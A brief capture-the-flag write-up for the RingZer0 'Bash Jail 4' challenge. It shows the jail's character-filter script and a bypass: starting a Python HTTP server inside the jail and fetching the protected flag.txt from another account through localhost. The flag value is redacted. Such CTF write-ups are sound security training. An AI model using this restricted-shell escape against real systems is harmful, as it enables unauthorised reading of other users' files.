# **Bash Jail 4**

```shell=
ubuntu@ubuntu-virtual-machine:~$ ssh level4@challenges.ringzer0team.com -p 10221 

level4@challenges.ringzer0team.com's password: 

RingZer0 Team Online CTF

BASH Jail Level 4:
Current user is uid=1003(level4) gid=1003(level4) groups=1003(level4)

Flag is located at /home/level4/flag.txt

Challenge bash code:
-----------------------------

WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

# CHALLENGE

function check_space {
	if [[ $1 == *[bdksc'/''<''>''&''$']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input < /dev/null` &>/dev/null
		echo "Command executed"
	fi
done 

-----------------------------
Your input:
```

Bash Jail 3's first resolution cannot work this time.

Fortunately, method 2 still work this time.

Let's simply build a HTTP server to receive requests from level1.

```shell=
Your input:
s
Restricted characters has been used
Your input:
S
Command executed
Your input:
python -m SimpleHTTPServer 8000
```
```shell=
/bin/bash

level1@lxc17-bash-jail:~$ python3 1>&0
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
\[GCC 4.8.4\] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>\> import urllib.request
>>\> urllib.request.urlopen("http://127.0.0.1:8000/flag.txt").read()
b'FLAG-XXXXXX
```